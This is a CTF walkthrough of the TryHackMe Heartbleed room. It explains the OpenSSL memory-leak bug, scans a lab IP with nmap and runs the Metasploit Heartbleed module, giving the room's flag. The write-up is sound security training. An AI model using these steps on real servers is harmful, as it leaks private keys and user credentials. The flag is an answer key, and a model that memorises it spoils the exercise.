#Heartbleed

Room [Heartbleed](https://tryhackme.com/room/heartbleed) on TryHackMe

<h2></h2>

<h3>Introduction to Heartbleed and SSL/TLS</h3>

- Heartbleed is a bug in OpenSSL 1.0.1 to 1.0.1f.
- It lets a user reach server memory they shouldn't.
- This helps a hacker get sensitive info like the server's private key and personal data like usernames and passwords.

<h2></h2>

<h3>Make a Directory for the Exercise</h3>

Make a directory with the room name in your TryHackMe Folder.

`cd Desktop/Tryhackme`

- Change a new directory call "Heartbleed".

`mkdir Heartbleed`

- Change directory into Heartbleed.

`cd Heartbleed/`

<p align="center">
<br/>
<img src="https://i.imgur.com/YcaZhtB.png" height="90%" width="90%" alt=""/>
<br />

<h2></h2>

In this CTF exercise, we will be using the Heartbleed payload in the `msfconsole` to capture the flag.

- Connect to TryHackMe network and deploy the machine.

- Gathering information from the target machine with Nmap command.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 34.253.209.9`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `34.253.209.9`.

<p align="center">
<br/>
<img src="https://i.imgur.com/Zh7084T.png" height="90%" width="90%" alt=""/>
<br />

Use `Mousepad` to put down the notes.

- nmap scanned three port opened:
  - Port: 22 TCP ssh
  - Port: 111 TCP rpcbind
  - Port: 443 TCP ssl/http
 
<h2></h2>

We will use msfconsole to exploit the target machine.

On Terminal: `msfconsole`

<p align="center">
<br/>
<img src="https://i.imgur.com/AO9GmR9.png" height="90%" width="90%" alt=""/>
<br />

Now msf6 is open we will search for the heartbleed exploit.

On Terminal: `search heartbleed`

- There are two options for the heartbleed exploit.

<p align="center">
<br/>
<img src="https://i.imgur.com/ul3dsWm.png" height="90%" width="90%" alt=""/>
<br />

We will use option 1 for the scanner to see if the target machine is exploitable. 

On Terminal: `use 1`
On Terminal: `show options`

- We can see that the "RHOSTS" is empty, so we can try to exploit it by putting in the target machine's IP Address.

<p align="center">
<br/>
<img src="https://i.imgur.com/KGvdX37.png" height="90%" width="90%" alt=""/>
<br />

We will set the Rhost to be the target machine.

On Terminal: `set RHOSTS 34.253.209.9`

<p align="center">
<br/>
<img src="https://i.imgur.com/D3cYMbi.png" height="90%" width="90%" alt=""/>
<br />

We will also set "Verbose" to true because we will need to be reading from the memory so need verbose to be "true".

On Terminal: `set VERBOSE true`

<p align="center">
<br/>
<img src="https://i.imgur.com/58zJW1j.png" height="90%" width="90%" alt=""/>
<br />

The payload is all set up, now we will run it.

On Terminal: `run`

- We have successfully capture the flag.

Flag: `THM{sSl-Is-BaD}`

<p align="center">
<br/>
<img src="https://i.imgur.com/43d7iA3.png" height="90%" width="90%" alt=""/>
<br />
